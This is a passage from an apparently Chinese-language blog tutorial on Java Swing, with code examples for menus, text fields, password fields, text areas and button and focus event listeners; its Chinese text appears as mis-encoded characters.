æ­£ç¡®ï¼šåœ°åŸºâ†’åœŸåœ°</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main10</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;èœå•ç»“æ„æ¼”ç¤º&quot;</span>);<br>        frame.setSize(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>);<br><br>        <span class="hljs-comment">// === ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºåœ°åŸºï¼ˆèœå•æ¡ï¼‰===</span><br>        <span class="hljs-type">JMenuBar</span> <span class="hljs-variable">menuBar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuBar</span>();<br><br>        <span class="hljs-comment">// === ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæ¥¼å±‚ï¼ˆä¸»èœå•ï¼‰å¹¶ä¾é™„åˆ°åœ°åŸº ===</span><br>        <span class="hljs-type">JMenu</span> <span class="hljs-variable">fileMenu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenu</span>(<span class="hljs-string">&quot;æ–‡ä»¶&quot;</span>);    <span class="hljs-comment">// 1æ¥¼ï¼šæ–‡ä»¶å±‚</span><br>        <span class="hljs-type">JMenu</span> <span class="hljs-variable">editMenu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenu</span>(<span class="hljs-string">&quot;ç¼–è¾‘&quot;</span>);    <span class="hljs-comment">// 2æ¥¼ï¼šç¼–è¾‘å±‚</span><br>        <span class="hljs-type">JMenu</span> <span class="hljs-variable">helpMenu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenu</span>(<span class="hljs-string">&quot;å¸®åŠ©&quot;</span>);    <span class="hljs-comment">// 3æ¥¼ï¼šå¸®åŠ©å±‚</span><br><br>        menuBar.add(fileMenu);  <span class="hljs-comment">// æ–‡ä»¶æ¥¼å±‚å»ºåœ¨åœ°åŸºä¸Š</span><br>        menuBar.add(editMenu);  <span class="hljs-comment">// ç¼–è¾‘æ¥¼å±‚å»ºåœ¨åœ°åŸºä¸Š  </span><br>        menuBar.add(helpMenu);  <span class="hljs-comment">// å¸®åŠ©æ¥¼å±‚å»ºåœ¨åœ°åŸºä¸Š</span><br><br>        <span class="hljs-comment">// === ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºæˆ¿é—´ï¼ˆèœå•é¡¹ï¼‰å¹¶ä¾é™„åˆ°æ¥¼å±‚ ===</span><br><br>        <span class="hljs-comment">// æ–‡ä»¶æ¥¼å±‚çš„æˆ¿é—´</span><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">newRoom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;æ–°å»º&quot;</span>);  <span class="hljs-comment">// æ–°å»ºæˆ¿é—´</span><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">openRoom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;æ‰“å¼€&quot;</span>); <span class="hljs-comment">// æ‰“å¼€æˆ¿é—´</span><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">saveRoom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;ä¿å­˜&quot;</span>); <span class="hljs-comment">// ä¿å­˜æˆ¿é—´</span><br><br>        fileMenu.add(newRoom);   <span class="hljs-comment">// æ–°å»ºæˆ¿é—´å»ºåœ¨æ–‡ä»¶æ¥¼å±‚</span><br>        fileMenu.add(openRoom);  <span class="hljs-comment">// æ‰“å¼€æˆ¿é—´å»ºåœ¨æ–‡ä»¶æ¥¼å±‚</span><br>        fileMenu.add(saveRoom);  <span class="hljs-comment">// ä¿å­˜æˆ¿é—´å»ºåœ¨æ–‡ä»¶æ¥¼å±‚</span><br><br>        <span class="hljs-comment">// ç¼–è¾‘æ¥¼å±‚çš„æˆ¿é—´</span><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">cutRoom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;å‰ªåˆ‡&quot;</span>);<br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">copyRoom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;å¤åˆ¶&quot;</span>);<br><br>        editMenu.add(cutRoom);   <span class="hljs-comment">// å‰ªåˆ‡æˆ¿é—´å»ºåœ¨ç¼–è¾‘æ¥¼å±‚</span><br>        editMenu.add(copyRoom);  <span class="hljs-comment">// å¤åˆ¶æˆ¿é—´å»ºåœ¨ç¼–è¾‘æ¥¼å±‚</span><br><br>        <span class="hljs-comment">// å¸®åŠ©æ¥¼å±‚çš„æˆ¿é—´</span><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">aboutRoom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;å…³äº&quot;</span>);<br><br>        helpMenu.add(aboutRoom); <span class="hljs-comment">// å…³äºæˆ¿é—´å»ºåœ¨å¸®åŠ©æ¥¼å±‚</span><br><br>        <span class="hljs-comment">// === æœ€åï¼šæŠŠæ•´ä¸ªå»ºç­‘ï¼ˆèœå•æ¡ï¼‰æ”¾åˆ°åœŸåœ°ä¸Šï¼ˆçª—å£ï¼‰===</span><br>        frame.setJMenuBar(menuBar);<br><br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-8-æ–‡æœ¬ç»„ä»¶"><a href="#4-8-æ–‡æœ¬ç»„ä»¶" class="headerlink" title="4.8 æ–‡æœ¬ç»„ä»¶"></a>4.8 æ–‡æœ¬ç»„ä»¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºæ–‡æœ¬æ¡†</span><br><span class="hljs-type">JTextField</span> <span class="hljs-variable">textField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-number">20</span>); <span class="hljs-comment">// 20åˆ—å®½åº¦</span><br><span class="hljs-type">JTextField</span> <span class="hljs-variable">textField2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;é»˜è®¤æ–‡æœ¬&quot;</span>);<br><br><span class="hljs-comment">// è·å–æ–‡æœ¬å†…å®¹</span><br><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> textField.getText();<br><br><span class="hljs-comment">// è®¾ç½®æ–‡æœ¬å†…å®¹</span><br>textField.setText(<span class="hljs-string">&quot;æ–°æ–‡æœ¬&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main11</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Frame&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">300</span>, <span class="hljs-number">100</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºæ ‡ç­¾</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è´¦å·ï¼š&quot;</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºæ–‡æœ¬æ¡†</span><br>        <span class="hljs-type">JTextField</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">20</span>);<br>        text.setSize(<span class="hljs-number">20</span>, <span class="hljs-number">30</span>);  <span class="hljs-comment">// è®¾ç½®æ–‡æœ¬æ¡†å¤§å°</span><br><br>        <span class="hljs-comment">// å°†ç»„ä»¶æ·»åŠ åˆ°çª—å£</span><br>        jf.add(label);<br>        jf.add(text);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-9-å¯†ç æ¡†ç»„ä»¶"><a href="#4-9-å¯†ç æ¡†ç»„ä»¶" class="headerlink" title="4.9 å¯†ç æ¡†ç»„ä»¶"></a>4.9 å¯†ç æ¡†ç»„ä»¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºå¯†ç æ¡†</span><br><span class="hljs-type">JPasswordField</span> <span class="hljs-variable">passwordField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPasswordField</span>(<span class="hljs-number">20</span>);<br><br><span class="hljs-comment">// è·å–å¯†ç ï¼ˆè¿”å›å­—ç¬¦æ•°ç»„ï¼‰</span><br><span class="hljs-type">char</span>[] password = passwordField.getPassword();<br><br><span class="hljs-comment">// å®‰å…¨å¤„ç†ï¼šä½¿ç”¨åæ¸…ç©ºå¯†ç </span><br>Arrays.fill(password, <span class="hljs-string">&#x27;0&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main12</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;ç™»å½•ç•Œé¢&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">300</span>, <span class="hljs-number">150</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºè´¦å·æ ‡ç­¾å’Œè¾“å…¥æ¡†</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è´¦å·ï¼š&quot;</span>);<br>        <span class="hljs-type">JTextField</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è´¦å·&quot;</span>, <span class="hljs-number">20</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºå¯†ç æ ‡ç­¾å’Œå¯†ç æ¡†</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å¯†ç ï¼š&quot;</span>);<br>        <span class="hljs-type">JPasswordField</span> <span class="hljs-variable">pwd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPasswordField</span>(<span class="hljs-number">20</span>);<br>        pwd.setEchoChar(<span class="hljs-string">&#x27;*&#x27;</span>); <span class="hljs-comment">// è®¾ç½®å¯†ç æ˜¾ç¤ºä¸º*</span><br><br>        <span class="hljs-comment">// å°†ç»„ä»¶æ·»åŠ åˆ°çª—å£</span><br>        jf.add(label);<br>        jf.add(text);<br>        jf.add(label2);<br>        jf.add(pwd);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-10-æ–‡æœ¬åŸŸç»„ä»¶"><a href="#4-10-æ–‡æœ¬åŸŸç»„ä»¶" class="headerlink" title="4.10 æ–‡æœ¬åŸŸç»„ä»¶"></a>4.10 æ–‡æœ¬åŸŸç»„ä»¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºæ–‡æœ¬åŒºåŸŸ</span><br><span class="hljs-type">JTextArea</span> <span class="hljs-variable">textArea</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextArea</span>(<span class="hljs-number">5</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 5è¡Œ20åˆ—</span><br><br><span class="hljs-comment">// è®¾ç½®è‡ªåŠ¨æ¢è¡Œ</span><br>textArea.setLineWrap(<span class="hljs-literal">true</span>);<br>textArea.setWrapStyleWord(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// æ”¾å…¥æ»šåŠ¨é¢æ¿</span><br><span class="hljs-type">JScrollPane</span> <span class="hljs-variable">scrollPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JScrollPane</span>(textArea);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main13</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Frame&quot;</span>);<br>        jf.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">300</span>, <span class="hljs-number">300</span>); <span class="hljs-comment">// å¢åŠ çª—å£é«˜åº¦ä»¥å®¹çº³æ–‡æœ¬åŒºåŸŸ</span><br><br>        <span class="hljs-comment">// åˆ›å»ºæ–‡æœ¬åŒºåŸŸ</span><br>        <span class="hljs-type">JTextArea</span> <span class="hljs-variable">area</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextArea</span>(<span class="hljs-number">12</span>, <span class="hljs-number">20</span>);<br><br>        <span class="hljs-comment">// å°†æ–‡æœ¬åŒºåŸŸæ·»åŠ åˆ°çª—å£</span><br>        jf.add(area);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-å¸¸ç”¨çš„äº‹ä»¶ç›‘å¬å™¨"><a href="#5-å¸¸ç”¨çš„äº‹ä»¶ç›‘å¬å™¨" class="headerlink" title="5. å¸¸ç”¨çš„äº‹ä»¶ç›‘å¬å™¨"></a>5. å¸¸ç”¨çš„äº‹ä»¶ç›‘å¬å™¨</h2><p>ä¸€ä¸ªäº‹ä»¶æ¨¡å‹ä¸­æœ‰ä¸‰ä¸ªå¯¹è±¡ï¼šäº‹ä»¶æºï¼Œäº‹ä»¶ï¼Œä»¥åŠç›‘å¬ç¨‹åºã€‚</p><p><img src="C:\Users\a1348\AppData\Roaming\Typora\typora-user-images\image-20251120135630474.png" alt="image-20251120135630474"></p><p><img src="C:\Users\a1348\AppData\Roaming\Typora\typora-user-images\image-20251120135656069.png" alt="image-20251120135656069"></p><p>1.æ–°å»ºä¸€ä¸ªç»„ä»¶ï¼ˆå¦‚JButton)<br>2.å°†è¯¥ç»„ä»¶æ·»åŠ åˆ°ç›¸åº”çš„é¢æ¿ï¼ˆå¦‚JFrame)ã€‚<br>3.æ³¨å†Œç›‘å¬å™¨ä»¥ç›‘å¬äº‹ä»¶æºäº§ç”Ÿçš„äº‹ä»¶ï¼ˆå¦‚é€šè¿‡ActionListeneræ¥å“åº”ç”¨æˆ·ç‚¹å‡»æŒ‰é’®)ã€‚<br>4.å®šä¹‰å¤„ç†äº‹ä»¶çš„æ–¹æ³•ï¼ˆå¦‚åœ¨ActionListenerä¸­çš„actionPerformedä¸­å®šä¹‰ç›¸åº”æ–¹æ³•)ã€‚</p><h3 id="5-1-åŠ¨ä½œäº‹ä»¶ç›‘å¬å™¨"><a href="#5-1-åŠ¨ä½œäº‹ä»¶ç›‘å¬å™¨" class="headerlink" title="5.1 åŠ¨ä½œäº‹ä»¶ç›‘å¬å™¨"></a>5.1 åŠ¨ä½œäº‹ä»¶ç›‘å¬å™¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">ç»„ä»¶.addActionListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionListener</span>()&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">actionPerformed</span><span class="hljs-params">(ActionEvent e)</span>&#123;<br>        <span class="hljs-comment">//TODO Auto-generated method stub</span><br>        <span class="hljs-comment">//å½“é¼ æ ‡ç‚¹å‡»çš„æ—¶å€™ï¼Œå°±æ‰§è¡Œçš„æ“ä½œ</span><br>        <span class="hljs-comment">// åœ¨è¿™é‡Œç¼–å†™ç‚¹å‡»æ—¶è¦æ‰§è¡Œçš„ä»£ç </span><br>        System.out.println(<span class="hljs-string">&quot;ç»„ä»¶è¢«ç‚¹å‡»&quot;</span>);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.awt.event.ActionEvent;<br><span class="hljs-keyword">import</span> java.awt.event.ActionListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ButtonClickTemplate</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 1. æ–°å»ºç»„ä»¶</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;çª—å£æ ‡é¢˜&quot;</span>);<br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;æŒ‰é’®æ–‡æœ¬&quot;</span>);<br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">label</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;æ ‡ç­¾åˆå§‹æ–‡æœ¬&quot;</span>);<br>        <br>        <span class="hljs-comment">// 2. æ·»åŠ åˆ°é¢æ¿</span><br>        frame.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        frame.add(button);<br>        frame.add(label);<br>        <br>        <span class="hljs-comment">// 3. æ³¨å†Œç›‘å¬å™¨ + 4. å®šä¹‰å¤„ç†æ–¹æ³•</span><br>        button.addActionListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionListener</span>() &#123;<br>            <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// è®¡æ•°å™¨å˜é‡</span><br>            <br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">actionPerformed</span><span class="hljs-params">(ActionEvent e)</span> &#123;<br>                <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> åœ¨è¿™é‡Œç¼–å†™æŒ‰é’®ç‚¹å‡»æ—¶è¦æ‰§è¡Œçš„ä»£ç </span><br>                <br>                <span class="hljs-comment">// ç¤ºä¾‹ï¼šè®¡æ•°åŠŸèƒ½</span><br>                count++;<br>                label.setText(<span class="hljs-string">&quot;ç‚¹å‡»æ¬¡æ•°: &quot;</span> + count);<br>                <br>                <span class="hljs-comment">// ç¤ºä¾‹ï¼šè§†è§‰åé¦ˆ</span><br>                <span class="hljs-keyword">if</span> (count % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) &#123;<br>                    button.setBackground(Color.GREEN);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    button.setBackground(Color.YELLOW);<br>                &#125;<br>                <br>                <span class="hljs-comment">// ç¤ºä¾‹ï¼šæ§åˆ¶å°è¾“å‡º</span><br>                System.out.println(<span class="hljs-string">&quot;æŒ‰é’®è¢«ç‚¹å‡»äº† &quot;</span> + count + <span class="hljs-string">&quot; æ¬¡&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <br>        <span class="hljs-comment">// çª—å£è®¾ç½®</span><br>        frame.setSize(<span class="hljs-number">300</span>, <span class="hljs-number">200</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-2-ç„¦ç‚¹äº‹ä»¶ç›‘å¬å™¨"><a href="#5-2-ç„¦ç‚¹äº‹ä»¶ç›‘å¬å™¨" class="headerlink" title="5.2 ç„¦ç‚¹äº‹ä»¶ç›‘å¬å™¨"></a>5.2 ç„¦ç‚¹äº‹ä»¶ç›‘å¬å™¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ç»„ä»¶.addFocusListener(<span class="hljs-keyword">new</span> <span class="hljs-title 